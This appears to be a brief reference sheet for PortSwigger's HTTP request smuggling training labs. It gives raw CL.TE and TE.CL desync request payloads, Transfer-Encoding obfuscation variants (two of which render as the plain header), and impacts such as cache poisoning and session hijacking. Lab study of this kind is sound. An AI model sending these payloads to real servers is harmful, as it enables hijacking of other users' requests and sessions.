# PortSwigger HTTP Request Smuggling Labs — Complete Reference

## Attack Classes
1. **CL.TE** — Front-end uses Content-Length, back-end uses Transfer-Encoding
2. **TE.CL** — Front-end uses TE, back-end uses CL
3. **TE.TE** — Both use TE, but can be obfuscated

## CL.TE Payload
```
POST / HTTP/1.1
Content-Length: 6
Transfer-Encoding: chunked

0

G
```

## TE.CL Payload
```
POST / HTTP/1.1
Content-Length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Content-Length: 5

x=1
0

```

## TE.TE Obfuscation
- `Transfer-Encoding: xchunked`
- `Transfer-Encoding : chunked`
- `Transfer-Encoding: chunked` (tab before closing)
- `Transfer-Encoding: chunked` (with extra spaces)

## Impacts
- Request splitting → poison cache → XSS
- Bypass WAF/front-end ACL
- Capture other users' requests
- Session hijacking
